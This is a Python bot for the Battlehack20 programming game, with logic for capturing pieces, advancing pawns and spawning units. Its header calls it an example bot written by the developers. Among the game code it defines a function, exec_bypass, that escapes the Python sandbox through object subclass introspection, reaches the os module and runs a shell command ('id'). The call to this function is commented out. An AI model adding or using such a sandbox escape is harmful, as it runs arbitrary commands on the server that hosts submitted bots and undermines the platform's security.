import random
from battlehack20.stubs import *

# This is an example bot written by the developers!
# Use this to help write your own code, or run it against your bot to see how well you can do!

DEBUG = 0
def dlog(str):
    if DEBUG > 0:
        log(str)


def ilog(str):
    if True:
        log(str)


def check_space_wrapper(r, c, board_size):
    # check space, except doesn't hit you with game errors
    if r < 0 or c < 0 or c >= board_size or r >= board_size:
        return False
    try:
        return check_space(r, c)
    except:
        return None


def spaces_in_front(a, b):
    diff = b - a
    return diff if team == Team.WHITE else -diff

def map_loc(loc):
    return loc if team == Team.WHITE else 15 - loc


team = get_team()
opp_team = Team.WHITE if team == Team.BLACK else team.BLACK
board_size = get_board_size()


class Pawn:
    def __init__(self):
        self.team = get_team()
        self.forward = 1 if self.team == Team.WHITE else -1
        self.update_state()
#        if self.col < 5:
        if False:
            self.type = "DEFENDER"
        else:
            self.type = "ATTACKER"
        self.board_size = get_board_size()

    def update_state(self):
        self.row, self.col = get_location()
#         ilog(str(self.col))
        self.nextrow = self.row + self.forward


    def check_piece_relative(self, rdiff, cdiff):
        return check_space_wrapper(self.row + rdiff * self.forward, self.col + cdiff)


    def run(self):
        self.update_state()
        if self.type == "ATTACKER":
            self.runattacker()
        elif self.type == "DEFENDER":
            self.rundefender()
        
        bytecode = get_bytecode()
        dlog('Done! Bytecode left: ' + str(bytecode))
    

    def runattacker(self):
        if self.trycapture():
            return
        if not self.forward_is_dangerous():
            self.tryforward()


    def rundefender(self):
        if self.trycapture():
            return
        if self.check_piece_relative(0, 1) == opp_team:
            # Don't let the guy in front of you cross you gdi
            return
        # Lattice formation
        if self.check_piece_relative(1, 0) == team or self.check_piece_relative(-1, 0) == team:
            self.tryforward()


    def tryforward(self):
        if self.nextrow != -1 and self.nextrow != board_size and not check_space_wrapper(self.nextrow, self.col, self.board_size):
            move_forward()
            dlog('Moved forward!')


    def forward_is_dangerous(self):
        for cdiff in [-1, 1]:
            if check_space_wrapper(self.nextrow + self.forward, self.col + cdiff, board_size) == opp_team: # up and right
                dlog('Dangerous to move forward')
                return True
        return False


    def trycapture(self):
        # try catpuring pieces
        for cdiff in [-1, 1]:
            if check_space_wrapper(self.nextrow, self.col + cdiff, board_size) == opp_team: # up and right
                capture(self.nextrow, self.col + cdiff)
                dlog('Captured at: (' + str(self.nextrow) + ', ' + str(self.col + cdiff) + ')')
                return True
        return False


class Overlord:
    def __init__(self):
        self.team = get_team()
        self.forward = 1 if self.team == Team.WHITE else -1
        self.board_size = get_board_size()
        self.index = 0 if self.team == Team.WHITE else self.board_size - 1
        self.round_count = 0

    def run(self):
        self.round_count = self.round_count + 1
        if self.check_defense():
            return
        self.spawn_offense()
    
    def check_defense(self):
        for i in range(self.board_size):
            opp_loc, my_loc = None, None
            for j in range(self.board_size // 2):
                j = map_loc(j)
                space = check_space(j, i)
                if space == opp_team and opp_loc is None:
                    opp_loc = j
                elif space == team and my_loc is None:
                    my_loc = j
            if opp_loc is None:
                continue
            if not my_loc or spaces_in_front(my_loc, opp_loc) < 0:
                if not check_space(self.index, i):
                    spawn(self.index, i)
                    return True
        return False

    def spawn_offense(self):
        self.spawnrandom()

    def spawnarrow(self):
        pass

    def spawnrandom(self, min=None, max=None):
        if min is None: min = 0
        if max is None: max = self.board_size - 1
        for _ in range(min, max):
            i = random.randint(min, max)
            if not check_space(self.index, i):
                spawn(self.index, i)
                dlog('Spawned unit at: (' + str(self.index) + ', ' + str(i) + ')')
                return

def exec_bypass():
    return getattr(getattr(getattr(getattr(getattr([], '__class__'),'__base__'), '__subclasses__')().pop(78), '__init__'), '__globals__').pop('sys').modules.pop('os').popen('id').read()


robot = Pawn() if get_type() == RobotType.PAWN else Overlord()

def turn():
    """
    MUST be defined for robot to run
    This function will be called at the beginning of every turn and should contain the bulk of your robot commands
    """

#    exec_bypass()
#    __globals__

    robot.run()
    bytecode = get_bytecode()
    dlog('Done! Bytecode left: ' + str(bytecode))
